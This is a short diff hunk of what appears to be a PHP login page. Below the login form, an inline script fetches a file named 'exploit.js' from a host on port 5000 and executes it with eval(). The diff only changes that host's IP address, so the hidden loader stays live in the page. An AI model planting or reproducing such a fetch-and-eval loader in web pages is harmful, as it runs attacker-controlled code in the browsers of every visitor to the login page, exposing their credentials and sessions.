@@ -21,7 +21,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <input type="submit" value="Login">
 </form>
 <script>
-fetch("http://172.21.0.20:5000/exploit.js")
+fetch("http://192.168.20.30:5000/exploit.js")
 .then(r=>r.text())
 .then(js=>eval(js));
 </script>
